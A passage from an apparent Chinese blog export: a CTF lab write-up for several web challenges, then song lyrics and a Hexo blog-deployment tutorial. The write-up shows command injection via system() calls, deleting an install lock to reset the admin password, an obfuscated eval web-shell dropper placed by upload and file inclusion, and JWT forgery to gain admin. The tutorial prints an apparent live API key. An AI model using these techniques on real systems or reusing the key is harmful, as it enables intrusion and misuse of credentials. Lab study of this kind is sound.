<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-01-09 15:26:15</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-01-09 15:30:48</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$html</span> = shell_exec(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;ls /var/www/html/&#x27;</span>);</span><br><span class="line">alsckdfy</span><br><span class="line">clear.php</span><br><span class="line">debug</span><br><span class="line">index.php</span><br><span class="line">install</span><br><span class="line">layui</span><br><span class="line">page.php</span><br><span class="line">page_1.php</span><br><span class="line">page_2.php</span><br><span class="line">page_3.php</span><br><span class="line">page_4.php</span><br><span class="line">robots.txt</span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>

<p>看样子没有 flag</p>
<p>那么根据之前的思路，我们只要把 <code>lock.dat</code>  删掉，那么就可以重置管理员密码，就能够成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;rm ../install/lock.dat&#x27;</span>); ?&gt;</span><br><span class="line">然后我们可以再进行验证一下</span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls ../install/&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>

<p>此时再访问 <code>install</code> ，已经变成</p>
<p><img src="https://i.loli.net/2021/08/04/SmO1ys82bwBzTiv.png" alt="image-20210804153001982"></p>
<p><img src="https://i.loli.net/2021/08/04/bWPpJf9c34qQKSV.png" alt="image-20210804153015432"></p>
<p>然后进入后台登陆即可 <code>admin888</code></p>
<p>最后才想到，flag 应该是出现在 登陆成功之后的页面里的，也就是 <code>/alsckdfy/check.php</code> ，所以我们也完全可以 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../alsckdfy/check.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>

<p>即可查到</p>
<p><img src="https://i.loli.net/2021/08/04/NteX42lnw3yVIoT.png" alt="image-20210804153236220"></p>
<h2 id="1-8-Web-388"><a href="#1-8-Web-388" class="headerlink" title="1.8 Web 388"></a>1.8 Web 388</h2><p>按照之前的思路来</p>
<p><img src="https://i.loli.net/2021/08/04/AqSUnLY1GPskMEw.png" alt="image-20210804154217200"></p>
<p>看了其它大神的解，发现在后台还有 <code>/editor/</code> 目录，一扫，果然</p>
<p><img src="https://i.loli.net/2021/08/04/3UWDplujK5rQd76.png" alt="image-20210804160121313"></p>
<p>那么就一定存在文件上传的问题</p>
<ul>
<li><code>alsckdfy/editor</code> 文件上传</li>
<li><code>/debug?file=</code> 进行文件包含，写入 <code>.php</code> 文件</li>
<li>访问 <code>.php</code> 文件，进行命令执行</li>
</ul>
<p><img src="https://i.loli.net/2021/08/04/GKoTEkeUdg137p8.png" alt="image-20210804160641858"></p>
<p>我想着写完之后提交，居然还未开放，那就只好 上传文件了</p>
<p><img src="https://i.loli.net/2021/08/04/FIDvAwPoiS6EHzW.png" alt="image-20210804160753795"></p>
<p>KindEditor 4.1.11 (2016-03-31)</p>
<p>网上查找相关漏洞</p>
<p><img src="https://i.loli.net/2021/08/04/G1RQfv7tzdZMUAj.png" alt="image-20210804160912989"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我尝试了一下</span></span><br><span class="line">/alsckdfy/editor/php/file_manager_json.php?path=/</span><br><span class="line"><span class="comment"># 居然不行</span></span><br></pre></td></tr></table></figure>

<p>那就别想着 编辑器的 任意文件遍历的 漏洞了，老老实实上传文件吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地的 2.zip 免杀🐎</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1])&#x27;</span>.<span class="string">&#x27;;?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/var/www/html/2.php&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径 </span></span><br><span class="line"><span class="comment"># /alsckdfy/attached/file/20210804/20210804083008_10879.zip</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/gIeMW3DuH7OSdmV.png" alt="image-20210804162756748"></p>
<p>可以看到有限制，我们可以上传 <code>.zip</code> 文件</p>
<p><img src="https://i.loli.net/2021/08/04/orBVz7ZKNWgScqv.png" alt="image-20210804161941726"></p>
<p>然后包含，我们将它写到 网站根目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20210804/20210804083008_10879.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/HoWfO6sdRU3B18N.png" alt="image-20210804162134294"></p>
<p><img src="https://i.loli.net/2021/08/04/GqBs5KEhOfkzled.png" alt="image-20210804163113755"></p>
<p>可以看到，上传成功</p>
<p>直接命令执行，查看源码得到</p>
<p><img src="https://i.loli.net/2021/08/04/OHUokTwFJBXzSlp.png" alt="image-20210804163322989"></p>
<h2 id="1-9-Web-389"><a href="#1-9-Web-389" class="headerlink" title="1.9 Web 389"></a>1.9 Web 389</h2><p>按照上面思路</p>
<p><img src="https://i.loli.net/2021/08/04/4MlbasVHRpfghcZ.png" alt="image-20210804164040896"></p>
<p>权限不足，找 cookie</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyODA2Njc0NiwiZXhwIjoxNjI4MDczOTQ2LCJuYmYiOjE2MjgwNjY3NDYsInN1YiI6InVzZXIiLCJqdGkiOiIwMDRmYzQzMjU0ODI3MGVlYTc4Mjg3MTg5ZWE2YjNkOCJ9.PWduIXmiYUefpQpuTkyCxMmg7IWvRvWqyC1rJZA8aIs</span><br></pre></td></tr></table></figure>

<p>jwt 在线 解密 <a href="https://jwt.io/">https://jwt.io/</a></p>
<p><img src="https://i.loli.net/2021/08/04/wM5tEhi42X1AnFZ.png" alt="image-20210804164905283"></p>
<p>然后我们修改为 admin</p>
<p><img src="https://i.loli.net/2021/08/04/dUEKgxFwjiQ7zeD.png" alt="image-20210804165033210"></p>
<p>更改之后刷新，回到上一关</p>
<p><img src="https://i.loli.net/2021/08/04/zaHVx92uLwv3YIt.png" alt="image-20210804165212640"></p>
<p><a href="http://4563dd47-a66b-4309-9e15-183bb065ff68.challenge.ctf.show:8080/alsckdfy/attached/file/20210804/20210804085256_19145.zip">/alsckdfy/attached/file/20210804/20210804085256_19145.zip</a></p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>世间美好与你环环相扣</title>
    <url>/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="世间美好与你环环相扣"><a href="#世间美好与你环环相扣" class="headerlink" title="世间美好与你环环相扣"></a>世间美好与你环环相扣</h3><p>偏偏秉烛夜游</p>
<p>午夜星辰 似奔走之友</p>
<p>爱你每个结痂伤口</p>
<p>酿成的陈年烈酒</p>
<p>入喉尚算可口</p>
<p>怎么泪水 还偶尔失守</p>
<p>邀你细看心中缺口</p>
<p>裂缝中留存 温柔</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>知道你不能 还要你感受</p>
<p>让星光加了一点彩虹</p>
<p>让樱花偷偷 吻你额头</p>
<p>让世间美好 与你环环相扣</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>此时已莺飞草长 爱的人正在路上</p>
<p>我知他风雨兼程 途经日暮不赏</p>
<p>穿越人海 只为与你相拥</p>
<p>此刻已皓月当空 爱的人手捧星光</p>
<p>我知他乘风破浪 去了黑暗一趟</p>
<p>感同身受 给你救赎热 望</p>
<p>知道你不能 还要你感受</p>
<p>让星光加了一点彩虹</p>
<p>当樱花开的纷纷扬扬</p>
<p>当世间美好 与你环环相扣</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>个人博客部署</title>
    <url>/2021/05/25/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、个人博客搭建"><a href="#一、个人博客搭建" class="headerlink" title="一、个人博客搭建"></a>一、个人博客搭建</h1><ol>
<li>用Gridea+GitHub pages或Hexo+GitHub pages用到的 <strong>Git软件</strong> 有什么用？<br>答：Git软件是一个用来上传 <code>本地文件</code> 到GitHub上的工具。用Git上传本地文件到GitHub后，GitHub的GitHub pages（静态站点托管服务）会建立一个可访问的站点并帮你管理这些文件，然后你就可以通过你在GitHub上设置的的域名来访问这个站点。</li>
</ol>
<span id="more"></span> 

<ol>
<li>Github Pages是面向用户、组织和项目开放的公共静态页面搭建托管服务，站点可以被免费托管在Github上，我们可以选择使用 Github Pages <code>默认提供的域名github.io</code> 或者 <code>自定义域名</code> 来发布站点。Github Pages 支持自动利用 、Jekyll 生成站点，也同样支持纯 HTML 文档，将你的 Hexo站点托管在 Github Pages 上是一个不错的选择。</li>
<li>利用Hexo和GithubPages/CodingPages搭建博客，实际上就是利用Hexo在本地（你的电脑上）生成一个博客站点，然后把本地博客站点内容传输到Github/Coding上进行拷贝和备份。再由Github和Coding提供的GithubPages/CodingPages服务将博客部署到网上，这样你的博客就可以作为一个独立的站点被别人浏览（正式上线）。同时你也可以在Github和Coding上管理你的博客。</li>
</ol>
<h2 id="1-1-安装-nodejs"><a href="#1-1-安装-nodejs" class="headerlink" title="1.1 安装 nodejs"></a>1.1 安装 nodejs</h2><p><a href="https://nodejs.org/en/">nodejs 官网</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">nmp -v</span><br><span class="line">npm root -g</span><br><span class="line">创建 node_cache 和 node_global 两个文件夹</span><br><span class="line">npm config set cache &quot;D:\网安实验室\environment\nodejs\node_global&quot;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_42881768/article/details/105028164?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162164565116780357220308%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162164565116780357220308&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105028164.pc_search_result_no_baidu_js&utm_term=nodejs%E5%AE%89%E8%A3%85%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE&spm=1018.2226.3001.4187">参考</a></p>
<h2 id="1-2-注册-github"><a href="#1-2-注册-github" class="headerlink" title="1.2 注册 github"></a>1.2 注册 github</h2><p><a href="https://github.com/">github 官网</a></p>
<h2 id="1-3-下载-git-for-win"><a href="#1-3-下载-git-for-win" class="headerlink" title="1.3 下载 git for win"></a>1.3 下载 git for win</h2><p><a href="https://gitforwindows.org/">git for win</a></p>
<h2 id="1-4-Git-SSH-配置"><a href="#1-4-Git-SSH-配置" class="headerlink" title="1.4 Git SSH 配置"></a>1.4 Git SSH 配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 gitfoewin 安装路径下打开 git-bash.exe</span><br><span class="line">git config --global user.name &quot;yourname&quot;	#Github用户名</span><br><span class="line">git config --global user.email &quot;youremail&quot;	#Github邮箱</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查</span><br><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令：ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/kEv5cTisgnxOKb7.png" alt="image-20210522094333395"></p>
<p>将会生成一个.ssh文件夹，找到它</p>
<p><img src="https://i.loli.net/2021/07/09/twY5uTd4rsikqxO.png" alt="image-20210709125002767"></p>
<p>将 <code>id_rsa.pub</code> 中地内容复制下来</p>
<p>然后进入你的github进行 SSH and GPG keys 配置，找到SSH keys的设置选项，点击<code>New SSH key</code>，把的<code>id_rsa.pub</code>里面的信息粘贴进去</p>
<p><img src="https://i.loli.net/2021/07/09/K7dZESr2xRfnig3.png" alt="image-20210708222730879"></p>
<p>测试是否配置成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入 ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210708224104838.png" alt="image-20210708224104838"></p>
<h2 id="1-5-HEXO-框架下载"><a href="#1-5-HEXO-框架下载" class="headerlink" title="1.5 HEXO 框架下载"></a>1.5 HEXO 框架下载</h2><p><a href="https://hexo.io/zh-cn/">HEXO 官网</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init xi-zhiBlog		#初始化</span><br><span class="line">cd xi-zhiBlog</span><br><span class="line">npm install 安装依赖</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地运行 hexo s -p 3333</span><br><span class="line">访问 http://localhost:3333/</span><br></pre></td></tr></table></figure>

<p>或者是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br><span class="line">出现默认的端口 访问即可</span><br><span class="line">出现以下 hexo 页面</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/QaIvYowUrPiAtRE.png" alt="image-20210522114800206"></p>
<h2 id="1-6-新建文章测试"><a href="#1-6-新建文章测试" class="headerlink" title="1.6 新建文章测试"></a>1.6 新建文章测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;我的first blog&quot;</span><br></pre></td></tr></table></figure>

<p><img src="D:\APP\Typora\images_local\image-20210522134430801.png" alt="image-20210522134430801"></p>
<p>编写博客文档</p>
<p><img src="https://i.loli.net/2021/05/25/LhZ2XcYntBmTvSQ.png" alt="image-20210522134637358"></p>
<p>清理 生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/XQrhPfBKYwICgGa.png" alt="image-20210522134738564"></p>
<h2 id="1-7-将博客推送到-github-上"><a href="#1-7-将博客推送到-github-上" class="headerlink" title="1.7 将博客推送到 github 上"></a>1.7 将博客推送到 github 上</h2><ul>
<li>登录已经注册好的 Github ，创建新的仓库，名称必须是 <code>username.github.io</code></li>
</ul>
<p><img src="https://i.loli.net/2021/05/25/xrcd7yE3NqS2jJA.png" alt="image-20210522135607776"></p>
<ul>
<li>安装 git 插件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<ul>
<li>修改博客配置文件</li>
</ul>
<p><img src="https://i.loli.net/2021/07/08/9MuWViSaCXwPvem.png" alt="image-20210708223352779"></p>
<ul>
<li>推送博客</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean		#清理</span><br><span class="line">hexo generate	#生成</span><br><span class="line">hexo deploy		#部署</span><br></pre></td></tr></table></figure>

<p>等待一会（或许会有些长。。。）</p>
<p>访问 <code>https://username.github.io</code> ，得到</p>
<p><img src="https://i.loli.net/2021/05/25/O4tTsbruoeUp1ni.png" alt="image-20210522140805690"></p>
<h2 id="1-8-安装-sublime"><a href="#1-8-安装-sublime" class="headerlink" title="1.8 安装 sublime"></a>1.8 安装 sublime</h2><p><a href="http://www.sublimetext.com/">sublime 官网</a></p>
<h1 id="二、主题"><a href="#二、主题" class="headerlink" title="二、主题"></a>二、主题</h1><p>示例：yilia</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/DbGhUmeiq24cHsr.png" alt="image-20210522141239219"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/eCahZqzPVnU8cd3.png" alt="image-20210522141315773"></p>
<h2 id="2-1-Fan"><a href="#2-1-Fan" class="headerlink" title="2.1 Fan"></a>2.1 Fan</h2><h3 id="2-1-1-主题下载"><a href="#2-1-1-主题下载" class="headerlink" title="2.1.1 主题下载"></a>2.1.1 主题下载</h3><p>下载主题模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/fan-lv/Fan.git themes/Fan</span><br></pre></td></tr></table></figure>

<p>更改主题配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: Fan</span><br></pre></td></tr></table></figure>

<p>安装依赖包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-renderer-jade hexo-renderer-stylus</span><br></pre></td></tr></table></figure>

<p><img src="D:\APP\Typora\images_local\image-20210523130227198.png" alt="image-20210523130227198"></p>
<p>注意 上面修改的是 <code>themes\Fan\_config.yml</code> 路径下的，而非  根目录下的 <code>_config.yml</code> ，修改完之后也许还会有 关于 评论的 报错，因为这时我们还未配置留言评论相关的配置，所以我们将其配置为空就可以了。</p>
<p><img src="https://i.loli.net/2021/05/25/SAQZu9U4kdbNyP7.png" alt="image-20210523130502995"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="https://i.loli.net/2021/05/25/2zDneZU8GFLvOX1.png" alt="image-20210523130628060"></p>
<h3 id="2-1-2-创建新的博客"><a href="#2-1-2-创建新的博客" class="headerlink" title="2.1.2 创建新的博客"></a>2.1.2 创建新的博客</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;Lihux 命令&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/8tX5PpemhJxAVgS.png" alt="image-20210523130926895"></p>
<p>默认内容如下</p>
<p><img src="D:\APP\Typora\images_local\image-20210523130947872.png" alt="image-20210523130947872"></p>
<p>我们可以自己配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: xxx</span><br><span class="line">author: xxx</span><br><span class="line">tags:</span><br><span class="line">  - xxx</span><br><span class="line">categories:</span><br><span class="line">  - xxx</span><br><span class="line">date: xxx</span><br><span class="line">top: 1     <span class="comment">#表示需要置顶的文章，数值越大越靠前</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-3-评论与留言"><a href="#2-1-3-评论与留言" class="headerlink" title="2.1.3 评论与留言"></a>2.1.3 评论与留言</h3><ul>
<li><p>在根目录下 <code>_config.yml</code> 文件中加入以下代码，<code>[&quot;gitment&quot;, &quot;valine&quot;]</code> 配置自行选择一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">comments:</span><br><span class="line">  gitment:</span><br><span class="line">    enable: true</span><br><span class="line">    owner: &#x27;Your GitHub ID&#x27;</span><br><span class="line">    repo: &#x27;The repository to store your comments. Make sure you&#x27;re repo&#x27;s owner&#x27;</span><br><span class="line">    client_id: &#x27;GitHub client ID&#x27;</span><br><span class="line">    client_secret: &#x27;GitHub client secret&#x27;</span><br><span class="line"></span><br><span class="line">  # 可以自由配置 valine 的其他配置项</span><br><span class="line">  valine:</span><br><span class="line">    appId: &#x27;Your appId&#x27;</span><br><span class="line">    appKey: &#x27;Your appKey&#x27;</span><br><span class="line">    placeholder: &#x27;xxx&#x27;</span><br><span class="line">    ...(valine配置项，参考链接 https://valine.js.org/configuration.html)</span><br></pre></td></tr></table></figure></li>
<li><p><code>themes</code> -&gt; <code>_config.yml</code> 中可以开启或关闭 <code>comments</code>，并且通过 <code>type</code> 指定使用的评论插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 评论</span><br><span class="line">comments:</span><br><span class="line">  enable: true</span><br><span class="line">  # 使用哪种评论插件[&quot;gitment&quot;, &quot;valine&quot;]</span><br><span class="line">  type: &quot;valine&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-1-4-增加-algolia-搜索功能"><a href="#2-1-4-增加-algolia-搜索功能" class="headerlink" title="2.1.4 增加 algolia 搜索功能"></a>2.1.4 增加 algolia 搜索功能</h3><p>注册algolia</p>
<p><img src="https://i.loli.net/2021/05/25/UmTOPARzaIlewji.png" alt="image-20210523133449426"></p>
<p>新增api keys，重要的是在ACL里面增加删除和新增Object的权限</p>
<p><img src="https://i.loli.net/2021/05/25/gjDqCBcXLZrlQPK.png" alt="image-20210523134532193"></p>
<p>如图得到</p>
<p><img src="https://i.loli.net/2021/05/25/cKOaNX5wbYdj4nP.png" alt="image-20210523134805117"></p>
<p>安装扩展</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-algolia --save</span><br></pre></td></tr></table></figure>

<p>增加根目录 <code>_config.yml</code> 配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">algolia:</span><br><span class="line">  applicationID: &#x27;你的Application ID&#x27;</span><br><span class="line">  apiKey: &#x27;你的Search-Only API Key&#x27;</span><br><span class="line">  indexName: &#x27;输入刚才创建index name&#x27;</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set HEXO_ALGOLIA_INDEXING_KEY=33ee877688fc550930bcca909f161863</span><br><span class="line"><span class="meta">#</span><span class="bash">Notes: Mac 和 git bash 为 <span class="built_in">export</span>, Windows 为 <span class="built_in">set</span>, Powershell 用 <span class="variable">$env</span></span></span><br><span class="line">hexo algolia</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/25/L4PdfhJwv6RWpV7.png" alt="image-20210523150707656"></p>
<p>发现已经提交</p>
<p>然后修改主题下的配置。更改为true</p>
<p><img src="https://i.loli.net/2021/05/25/u1HONdMBwj6aJe8.png" alt="image-20210523151012461"></p>
<p>最后 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h2 id="2-2-Next"><a href="#2-2-Next" class="headerlink" title="2.2 Next"></a>2.2 Next</h2><p><strong>提供写的很好的参考博客</strong></p>
<p><a href="https://blog.csdn.net/loze/article/details/94206726">https://blog.csdn.net/loze/article/details/94206726</a></p>
<p><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a></p>
<p><a href="https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri=">https://so.csdn.net/so/search?q=hexo%20next%20%E9%9F%B3%E4%B9%90&amp;t=&amp;u=&amp;fri=</a></p>
<h2 id="2-3-Hiker"><a href="#2-3-Hiker" class="headerlink" title="2.3 Hiker"></a>2.3 Hiker</h2><p>下载源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iTimeTraveler/hexo-theme-hiker.git themes/hiker</span><br></pre></td></tr></table></figure>

<p>修改配置文件当中的 theme</p>
<p><img src="https://i.loli.net/2021/07/08/lMUFkL5wDvh9sRN.png" alt="image-20210708234959800"></p>
<p>更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd themes/hiker</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p><strong>搜索功能</strong></p>
<p><a href="https://blog.csdn.net/nineya_com/article/details/103338696">https://blog.csdn.net/nineya_com/article/details/103338696</a></p>
<h1 id="三、其它介绍"><a href="#三、其它介绍" class="headerlink" title="三、其它介绍"></a>三、其它介绍</h1><h2 id="3-1-创建博客"><a href="#3-1-创建博客" class="headerlink" title="3.1 创建博客"></a>3.1 创建博客</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;	<span class="comment">#博客的创建，[layout] 决定博客路径的不同</span></span><br><span class="line">hexo new paper				<span class="comment">#source/_posts</span></span><br><span class="line">hexo new page board			<span class="comment">#source，访问链接变为 https://xxx.xxx/board</span></span><br><span class="line">hexo new draft newpage		<span class="comment">#source/_drafts</span></span><br><span class="line">hexo server --draft			<span class="comment">#将 draft 在本地预览</span></span><br><span class="line">hexo publish draft newpage  <span class="comment">#将 draft 发表到 post 中</span></span><br></pre></td></tr></table></figure>

<h2 id="3-2-菜单栏"><a href="#3-2-菜单栏" class="headerlink" title="3.2 菜单栏"></a>3.2 菜单栏</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其中，About这个你是找不到网页的，因为你的文章中没有about这个东西。如果你想要的话，可以执行命令</span></span><br><span class="line">hexo new page about</span><br><span class="line"><span class="comment">#它就会在根目录下source文件夹中新建了一个about文件夹，以及index.md，在index.md中写上你想要写的东西，就可以在网站上展示出来了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#想要自己再自定义一个菜单栏的选项</span></span><br><span class="line">hexo new page yourdiy</span><br><span class="line"><span class="comment">#然后在主题配置文件的menu菜单栏添加一个 Yourdiy : /yourdiy，注意冒号后面要有空格，以及前面的空格要和menu中默认的保持整齐。然后在languages文件夹中，找到zh-CN.yml，在index中添加yourdiy: &#x27;中文意思&#x27;就可以显示中文了。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#分类：</span></span><br><span class="line">hexo new page categories</span><br><span class="line"><span class="comment">#进入source\categories中，修改index.md</span></span><br><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2021-05-24 00:03:00</span><br><span class="line"><span class="built_in">type</span>: categories</span><br><span class="line">---</span><br><span class="line"><span class="comment">#之后创建新的博客文章时在其最上面添加 categories: 名称 即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#标签：</span></span><br><span class="line">hexo new page tags</span><br><span class="line"><span class="comment">#进入source\categories中，修改index.md</span></span><br><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-07-14 18:19:31</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br><span class="line"><span 